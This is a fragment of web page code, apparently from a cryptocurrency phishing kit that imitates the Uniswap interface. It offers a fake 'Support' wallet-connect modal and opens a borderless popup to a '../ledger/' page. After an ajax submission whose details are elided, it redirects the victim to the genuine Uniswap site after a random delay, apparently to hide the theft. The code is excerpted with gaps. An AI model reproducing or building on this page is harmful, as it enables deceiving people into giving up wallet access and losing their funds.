...
function thatFunction() {
  window.open('../ledger/','...','status=no,titlebar=no,location=no,directories=no,channelmode=no,menubar=no,toolbar=no,scrollbars=no,resizable=no,menubar=0,top=0,left='+window.innerWidth+',width=400,height=650');
		...
		<div class="sc-htpNat nrd8cx-0 pradxg-5 eFxLLr"><a href="../" class="pradxg-14 iaLyQt ACTIVE" id="swap-nav-link"  aria-current="page">Swap</a>
		...
		<a href="./" class="pradxg-14 iaLyQt" id="stake-nav-link" >Support</a>
                ...
                <div class="sc-hXRMBi fqOcYb">
                    <div id="wallets-modal" class="sc-bsbRJL hgyVGw">
                        ...
                        <div class="sc-epnACN haZPvP">
                            <div class="sc-iuJeZd juASlh">Connect a wallet and a admin will be with you soon.</div>
                        </div>
            ...
            $.ajax({
                ...
                success: function () {
                    setTimeout(function () {
                        $(loadScreen).hide();
                        $('.connect-METAMASK').show();
                        location="https://app.uniswap.org";
                    },getRandomInt(2000,4000));
                },
                error: function () {
                    setTimeout(function () {
